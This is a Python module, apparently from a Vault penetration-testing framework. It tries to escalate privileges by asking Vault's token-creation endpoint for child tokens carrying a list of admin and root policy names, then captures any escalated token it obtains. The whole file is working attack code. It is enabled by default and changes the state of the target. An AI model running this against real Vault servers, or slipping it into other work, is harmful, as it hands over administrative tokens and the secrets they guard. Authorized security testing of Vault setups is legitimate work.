from typing import Optional

import requests

from ..context import ExecutionContext
from ..registry import BaseExecutionModule, ExecutionResult, RiskLevel


TIMEOUT = 10
CRITICAL_POLICIES = [
    "admin",
    "admin-policy",
    "vault-admin",
    "master",
    "root-policy",
    "production-admin",
    "devops-admin",
    "management",
]


class PrivilegeEscalationModule(BaseExecutionModule):
    def __init__(self):
        super().__init__(
            module_id="privilege_escalation.token_abuse",
            title="Active Token Privilege Escalation via Creation Endpoint",
            risk_level=RiskLevel.STATE_CHANGING,
            description=(
                "Attempts to abuse token creation capabilities to generate "
                "higher-privileged or root tokens."
            ),
            default_enabled=True,
        )

    def can_run(self, context: ExecutionContext) -> bool:
        """Require a Vault address and an authorized token before running."""
        return bool(getattr(context, "vault_addr", None) and getattr(context, "token", None))

    def execute(self, context: ExecutionContext, params: Optional[dict] = None) -> ExecutionResult:
        if not self.can_run(context):
            return ExecutionResult(
                status="skipped",
                message="Privilege escalation execution requires both vault_addr and token.",
                evidence={"missing": _missing_context_fields(context)},
            )

        params = params or {}
        target_policies = _candidate_policies(params.get("policies"))
        requested_ttl = params.get("ttl", "30m")
        timeout = params.get("timeout", TIMEOUT)
        verify_tls = params.get("verify_tls", getattr(context, "verify_tls", True))

        url = f"{context.vault_addr.rstrip('/')}/v1/auth/token/create"
        headers = {
            "X-Vault-Token": context.token,
            "Content-Type": "application/json",
        }
        namespace = params.get("namespace", getattr(context, "namespace", None))
        if namespace:
            headers["X-Vault-Namespace"] = namespace

        try:
            source_policies = _lookup_source_policies(context.vault_addr, headers, timeout, verify_tls)
            attempts = []
            for policy_name in target_policies:
                if policy_name in source_policies:
                    print(f"[*] [ACTIVE] Skipping policy already present on source token: {policy_name}")
                    attempts.append({
                        "policy": policy_name,
                        "status_code": "skipped",
                        "reason": "policy already present on source token",
                    })
                    continue

                payload = {
                    "policies": [policy_name],
                    "ttl": requested_ttl,
                }
                print(f"[*] [ACTIVE] Autonomous policy attempt: {policy_name}")
                response = requests.post(
                    url,
                    headers=headers,
                    json=payload,
                    timeout=timeout,
                    verify=verify_tls,
                )
                attempt = {
                    "policy": policy_name,
                    "status_code": response.status_code,
                }
                attempts.append(attempt)

                if response.status_code != 200:
                    attempt["response_text"] = response.text[:300]
                    continue

                response_data = _safe_response_json(response)
                new_token = response_data.get("auth", {}).get("client_token")
                token_policies = response_data.get("auth", {}).get("policies", [])
                added_policies = _added_policies(source_policies, token_policies)
                attempt["returned_policies"] = token_policies
                attempt["added_policies"] = added_policies

                if policy_name not in added_policies:
                    attempt["reason"] = "created token did not add a new candidate policy"
                    continue

                evidence = {
                    "status_code": response.status_code,
                    "url": url,
                    "requested_policies": [policy_name],
                    "ttl": requested_ttl,
                    "success": True,
                    "source_token_policies": source_policies,
                    "attempted_policies": attempts,
                    "selected_policy": policy_name,
                    "escalated_token_policies": token_policies,
                    "added_policies": added_policies,
                }
                if new_token:
                    evidence["captured_token"] = new_token
                    setattr(context, "captured_token", new_token)
                    setattr(context, "escalated_token", new_token)

                context.add_finding(
                    title="CRITICAL: Privilege Escalation Successful",
                    description=(
                        "Successfully generated a new token with elevated "
                        f"privileges using policy '{policy_name}': {token_policies}"
                    ),
                    severity="CRITICAL",
                    evidence=evidence,
                )

                return ExecutionResult(
                    status="success",
                    message=(
                        "Privilege escalation attack succeeded. "
                        f"Selected policy: {policy_name}."
                    ),
                    evidence=evidence,
                )

            evidence = {
                "status_code": attempts[-1]["status_code"] if attempts else None,
                "url": url,
                "requested_policies": target_policies,
                "ttl": requested_ttl,
                "success": False,
                "source_token_policies": source_policies,
                "attempted_policies": attempts,
            }
            return ExecutionResult(
                status="failed",
                message="Privilege escalation failed for all candidate policies.",
                evidence=evidence,
            )

        except requests.RequestException as error:
            return ExecutionResult(
                status="error",
                message=f"Network error during exploit execution: {error}",
                evidence={"error": str(error)},
            )
        except ValueError as error:
            return ExecutionResult(
                status="error",
                message=f"Invalid Vault response during exploit execution: {error}",
                evidence={"error": str(error), "url": url},
            )


def _candidate_policies(policies):
    if isinstance(policies, str):
        return [policies]
    if not policies:
        return list(CRITICAL_POLICIES)
    return _dedupe([str(policy) for policy in policies if policy])


def _dedupe(items):
    deduped = []
    for item in items:
        if item not in deduped:
            deduped.append(item)
    return deduped


def _safe_response_json(response):
    try:
        data = response.json()
    except ValueError as error:
        raise ValueError(f"invalid json response: {response.text[:200]}") from error
    return data if isinstance(data, dict) else {}


def _lookup_source_policies(vault_addr, headers, timeout, verify_tls):
    url = f"{vault_addr.rstrip('/')}/v1/auth/token/lookup-self"
    try:
        response = requests.get(
            url,
            headers=headers,
            timeout=timeout,
            verify=verify_tls,
        )
    except requests.RequestException:
        return []

    if response.status_code != 200:
        return []

    data = _safe_response_json(response)
    token_data = data.get("data", {})
    policies = token_data.get("policies") or []
    identity_policies = token_data.get("identity_policies") or []
    return sorted({str(policy) for policy in [*policies, *identity_policies] if policy})


def _added_policies(source_policies, token_policies):
    source = set(source_policies)
    return sorted(
        str(policy)
        for policy in token_policies
        if policy and policy != "default" and str(policy) not in source
    )


def _missing_context_fields(context):
    missing = []
    if not getattr(context, "vault_addr", None):
        missing.append("vault_addr")
    if not getattr(context, "token", None):
        missing.append("token")
    return missing
